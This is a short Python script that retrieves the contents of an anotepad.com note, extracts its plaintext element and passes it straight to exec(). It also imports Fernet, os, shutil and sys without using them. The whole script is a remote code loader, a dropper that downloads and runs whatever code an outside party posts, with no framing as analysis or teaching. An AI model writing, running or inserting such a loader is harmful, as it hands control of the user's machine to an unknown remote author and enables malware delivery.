import requests
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import os
import time
import shutil
import sys
url = "https://anotepad.com/notes/3gkei2dg"

def main():
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    plaintext_content = soup.find(class_="plaintext")
    exec(plaintext_content.text.strip())


main()
